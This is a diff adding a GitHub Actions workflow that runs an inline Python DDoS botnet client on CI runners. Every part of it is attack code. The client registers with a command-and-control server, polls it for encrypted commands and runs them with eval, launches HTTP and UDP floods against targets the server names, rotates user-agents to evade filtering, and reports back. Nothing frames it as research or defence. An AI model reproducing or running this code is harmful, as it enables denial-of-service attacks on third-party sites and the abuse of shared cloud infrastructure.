@@ -1,0 +1,331 @@
+name: C2 Client Agent
+
+on:
+  workflow_dispatch:
+    inputs:
+      duration:
+        description: 'Attack duration override (seconds)'
+        required: false
+        default: '0'
+
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    
+    steps:
+      - name: Setup Python Environment
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.11'
+      
+      - name: Install Dependencies
+        run: |
+          pip install requests cryptography --quiet
+      
+      - name: Execute C2 Client
+        env:
+          C2_SERVER: ${{ secrets.C2_SERVER }}
+          ENCRYPTION_KEY: ${{ secrets.ENCRYPTION_KEY }}
+        run: |
+          python3 << 'EOF'
+          import requests
+          import socket
+          import time
+          import random
+          import threading
+          import sys
+          import os
+          from cryptography.fernet import Fernet
+          from urllib.parse import urlparse
+          
+          # ============ CONFIGURATION ============
+          
+          C2_SERVER = os.environ.get('C2_SERVER')
+          ENCRYPTION_KEY = os.environ.get('ENCRYPTION_KEY')
+          
+          if not C2_SERVER:
+              print("❌ ERROR: C2_SERVER not configured in GitHub Secrets!")
+              sys.exit(1)
+          
+          if not ENCRYPTION_KEY:
+              print("❌ ERROR: ENCRYPTION_KEY not configured in GitHub Secrets!")
+              sys.exit(1)
+          
+          # Initialize encryption
+          try:
+              cipher = Fernet(ENCRYPTION_KEY.encode())
+          except Exception as e:
+              print(f"❌ ERROR: Invalid encryption key format: {e}")
+              sys.exit(1)
+          
+          # 50 Different User-Agents
+          USER_AGENTS = [
+              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
+              'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
+              'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
+              'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
+              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
+              'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
+              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0',
+              'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
+              'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15',
+              'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0',
+              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/119.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
+              'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0',
+              'Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
+              'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0',
+              'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
+              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
+              'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/118.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0',
+              'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
+              'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15',
+              'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0',
+              'Mozilla/5.0 (X11; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0'
+          ]
+          
+          # Agent state
+          agent_id = None
+          stats = {
+              "requests_sent": 0,
+              "errors": 0,
+              "status": "idle"
+          }
+          
+          # ============ ENCRYPTION FUNCTIONS ============
+          
+          def decrypt_command(encrypted_data):
+              try:
+                  decrypted = cipher.decrypt(encrypted_data.encode()).decode()
+                  return eval(decrypted)
+              except Exception as e:
+                  print(f"❌ Decryption error: {e}")
+                  return {"type": "idle"}
+          
+          # ============ ATTACK FUNCTIONS ============
+          
+          def http_flood(target, duration, rate):
+              print(f"🔥 HTTP FLOOD: {target} | Duration: {duration}s | Rate: {rate}/s")
+              end_time = time.time() + duration
+              count = 0
+              errors = 0
+              session = requests.Session()
+              
+              while time.time() < end_time:
+                  try:
+                      headers = {
+                          'User-Agent': random.choice(USER_AGENTS),
+                          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                          'Accept-Language': 'en-US,en;q=0.5',
+                          'Connection': 'keep-alive',
+                      }
+                      session.get(target, headers=headers, timeout=3)
+                      count += 1
+                      if rate > 0:
+                          time.sleep(1.0 / rate)
+                  except Exception:
+                      errors += 1
+              return count, errors
+          
+          def udp_flood(target, duration, rate):
+              try:
+                  parsed = urlparse(target)
+                  host = parsed.hostname or target
+                  port = parsed.port or 80
+                  ip = socket.gethostbyname(host)
+                  print(f"🔥 UDP FLOOD: {ip}:{port} | Duration: {duration}s")
+                  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                  payload = random._urandom(1024)
+                  end_time = time.time() + duration
+                  count = 0
+                  errors = 0
+                  
+                  while time.time() < end_time:
+                      try:
+                          sock.sendto(payload, (ip, port))
+                          count += 1
+                          if rate > 0:
+                              time.sleep(1.0 / rate)
+                      except Exception:
+                          errors += 1
+                  sock.close()
+                  return count, errors
+              except Exception as e:
+                  print(f"❌ UDP Flood error: {e}")
+                  return 0, 1
+          
+          def execute_attack(command):
+              global stats
+              target = command.get('target')
+              method = command.get('method', 'http')
+              duration = int(command.get('duration', 60))  # Convert to int
+              rate = int(command.get('rate', 100))  # Convert to int
+              stats['status'] = 'attacking'
+              print(f"⚡ Attack started: {method.upper()} → {target}")
+              
+              if method == 'http':
+                  count, errors = http_flood(target, duration, rate)
+                  stats['requests_sent'] += count
+                  stats['errors'] += errors
+              elif method == 'udp':
+                  count, errors = udp_flood(target, duration, rate)
+                  stats['requests_sent'] += count
+                  stats['errors'] += errors
+              elif method == 'both':
+                  http_thread = threading.Thread(target=lambda: http_flood(target, duration, rate))
+                  udp_thread = threading.Thread(target=lambda: udp_flood(target, duration, rate))
+                  http_thread.start()
+                  udp_thread.start()
+                  http_thread.join()
+                  udp_thread.join()
+              
+              stats['status'] = 'idle'
+              print(f"✅ Attack completed: {stats['requests_sent']} requests sent")
+          
+          # ============ C2 COMMUNICATION ============
+          
+          def register_agent():
+              global agent_id
+              try:
+                  response = requests.post(
+                      f"http://{C2_SERVER}/api/register",
+                      json={},
+                      timeout=10
+                  )
+                  if response.status_code == 200:
+                      data = response.json()
+                      agent_id = data['agent_id']
+                      print(f"✅ Registered as: {agent_id}")
+                      return True
+                  else:
+                      print(f"❌ Registration failed: {response.status_code}")
+                      return False
+              except Exception as e:
+                  print(f"❌ Registration error: {e}")
+                  return False
+          
+          def poll_command():
+              try:
+                  response = requests.post(
+                      f"http://{C2_SERVER}/api/poll",
+                      json={"agent_id": agent_id},
+                      timeout=10
+                  )
+                  if response.status_code == 200:
+                      data = response.json()
+                      encrypted_command = data['command']
+                      command = decrypt_command(encrypted_command)
+                      return command, None  # Success, no error
+                  else:
+                      return {"type": "idle"}, f"HTTP {response.status_code}"
+              except requests.exceptions.ConnectionError:
+                  return None, "connection_refused"
+              except requests.exceptions.Timeout:
+                  return None, "timeout"
+              except Exception as e:
+                  return None, str(e)
+          
+          def report_stats():
+              try:
+                  requests.post(
+                      f"http://{C2_SERVER}/api/report",
+                      json={
+                          "agent_id": agent_id,
+                          "status": stats['status'],
+                          "requests_sent": stats['requests_sent'],
+                          "errors": stats['errors']
+                      },
+                      timeout=10
+                  )
+              except Exception as e:
+                  print(f"❌ Report error: {e}")
+          
+          # ============ MAIN LOOP ============
+          
+          def main():
+              print("="*60)
+              print("🚀 C2 CLIENT STARTING")
+              print("="*60)
+              
+              if not register_agent():
+                  print("❌ Failed to register. Exiting.")
+                  sys.exit(1)
+              
+              print(f"📡 Connected to C2: {C2_SERVER}")
+              print(f"🆔 Agent ID: {agent_id}")
+              print("⏳ Waiting for commands...")
+              print("="*60)
+              
+              attack_thread = None
+              
+              while True:
+                  try:
+                      command = poll_command()
+                      
+                      if command['type'] == 'attack':
+                          # Start attack in a separate thread
+                          if attack_thread is None or not attack_thread.is_alive():
+                              attack_thread = threading.Thread(target=execute_attack, args=(command,))
+                              attack_thread.start()
+                      
+                      elif command['type'] == 'stop':
+                          print("🛑 Stop command received - halting attacks")
+                          # Just stop attacking, don't exit
+                          stats['status'] = 'idle'
+                          report_stats()
+                          # Continue polling for new commands
+                      
+                      elif command['type'] == 'offline':
+                          print("⚠️ OFFLINE command received - shutting down")
+                          stats['status'] = 'offline'
+                          report_stats()
+                          break  # Exit the loop
+                      
+                      time.sleep(5)
+                  
+                  except KeyboardInterrupt:
+                      print("\n⚠️ Interrupted by user")
+                      break
+                  
+                  except Exception as e:
+                      print(f"❌ Main loop error: {e}")
+                      time.sleep(10)
+              
+              print("="*60)
+              print("👋 Client shutting down")
+              print(f"📊 Total requests: {stats['requests_sent']}")
+              print(f"❌ Total errors: {stats['errors']}")
+              print("="*60)
+          
+          if __name__ == "__main__":
+              main()
+          EOF
